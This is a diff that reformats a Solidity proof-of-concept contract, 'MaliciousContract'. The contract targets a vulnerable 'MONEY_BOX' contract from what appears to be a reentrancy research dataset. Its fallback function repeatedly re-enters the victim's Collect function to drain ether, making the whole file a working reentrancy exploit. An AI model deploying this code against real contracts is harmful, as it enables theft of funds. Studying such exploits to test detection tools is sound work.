@@ -1,27 +1,29 @@
 pragma solidity ^0.4.19;
 import "../dataset/reentrancy/0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888.sol";
 
-contract MaliciousContract{
+contract MaliciousContract {
     MONEY_BOX money_box;
-    
 
-    constructor(address _victimAddress) public{
-        money_box= MONEY_BOX (_victimAddress);
+    constructor(address _victimAddress) public {
+        money_box = MONEY_BOX(_victimAddress);
     }
 
-   function attack(uint amount) public {
-        require(amount >= 1 ether, "Must attempt and attack with at least 1 ether");
+    function attack(uint256 amount) public {
+        require(
+            amount >= 1 ether,
+            "Must attempt and attack with at least 1 ether"
+        );
         money_box.Collect(amount);
     }
 
-    function deposit()  public payable{
+    function deposit() public payable {
         require(msg.value >= 1 ether, "Must add at least 1 ether");
-        money_box.Put.value(msg.value)(0);        
+        money_box.Put.value(msg.value)(0);
     }
 
-    function() payable public {
+    function() public payable {
         // Re-enter the vulnerable function if there's still balance to collect
-        if ( address(money_box).balance >= 1 ether) {
+        if (address(money_box).balance >= 1 ether) {
             money_box.Collect(1 ether);
         }
     }
